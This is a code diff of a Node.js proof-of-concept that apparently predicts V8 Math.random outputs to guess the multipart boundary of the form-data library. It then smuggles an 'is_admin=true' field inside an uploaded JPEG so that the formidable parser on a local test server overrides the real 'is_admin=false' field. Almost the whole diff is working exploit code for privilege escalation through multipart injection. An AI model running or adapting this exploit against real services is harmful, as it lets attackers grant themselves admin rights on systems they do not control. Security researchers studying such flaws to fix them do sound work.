@@ -3,6 +3,7 @@ const IncomingForm = require("formidable").IncomingForm;
 const predictV8Randomness = require("predict-v8-randomness");
 const path = require("path");
 const FormData = require("form-data");
+const fs = require("fs");
 
 const port = 5000;
 const rootDir = __dirname;
@@ -22,45 +23,61 @@ predictor.predictNext(24).then(function (next24RandomOutputs) {
     .join("");
 
   const boundaryIntro = "----------------------------";
-
-  const payload =
-    "zzz" +
+  const boundary = boundaryIntro + predictedBoundary;
+  const injectedPayload =
     "\r\n" +
-    boundaryIntro +
-    predictedBoundary +
+    boundary +
     '\r\nContent-Disposition: form-data; name="is_admin"\r\n\r\ntrue\r\n' +
-    boundaryIntro +
-    predictedBoundary +
+    boundary +
     "--\r\n";
 
-  const FIELDS = {
-    my_field: {
-      value: payload,
-    },
-    is_admin: {
-      value: "false",
-    },
-  };
-
   server.listen(port, () => {
-    const form = new FormData();
+    // Read the image file
+    const imagePath = path.join(rootDir, "cabo-pero.jpeg");
+    const imageStream = fs.createReadStream(imagePath);
 
-    Object.entries(FIELDS).forEach(([name, field]) => {
-      form.append(
-        name,
-        typeof field.value === "function" ? field.value() : field.value
-      );
+    // Create a PassThrough stream to append the injected payload after the image
+    const { PassThrough } = require("stream");
+    const combinedStream = new PassThrough();
+
+    imageStream.on("end", () => {
+      combinedStream.write(injectedPayload);
+      combinedStream.end();
     });
 
-    form.submit(`http://localhost:${port}/`, (err, res) => {
-      if (err) {
-        throw err;
-      }
+    imageStream.pipe(combinedStream, { end: false });
 
-      // unstuck new streams
-      res.resume();
+    // Save combined stream to a new jpeg file
+    const injectedImagePath = path.join(rootDir, "cabo-pero-injected.jpeg");
+    const fileWriteStream = fs.createWriteStream(injectedImagePath);
+    combinedStream.pipe(fileWriteStream);
 
-      server.close();
+    fileWriteStream.on("finish", () => {
+      // This normal
+      // const imageData = fs.readFileSync(imagePath);
+      // This override server side fields
+      const imageData = fs.readFileSync(injectedImagePath);
+
+      const form = new FormData();
+
+      // Append the image field with the combined stream
+      form.append("my_field", imageData, {
+        filename: "cabo-pero.jpeg",
+        contentType: "image/jpeg",
+      });
+
+      form.append("is_admin", "false");
+
+      form.submit(`http://localhost:${port}/`, (err, res) => {
+        if (err) {
+          throw err;
+        }
+
+        // unstuck new streams
+        res.resume();
+
+        server.close();
+      });
     });
   });
 });
@@ -68,6 +85,7 @@ predictor.predictNext(24).then(function (next24RandomOutputs) {
 const server = http.createServer((req, res) => {
   const incomingForm = new IncomingForm({
     uploadDir: path.join(rootDir, "/tmp"),
+    keepExtensions: true,
   });
   incomingForm.parse(req);
 
@@ -76,7 +94,7 @@ const server = http.createServer((req, res) => {
       console.log(`Field: ${name} = ${value}`);
     })
     .on("file", function (name, file) {
-      console.log(`File: ${name} = ${file.name}`);
+      console.log(`File: ${name} = ${file.originalFilename}`);
     })
     .on("end", function () {
       console.log("Form parsing completed.");
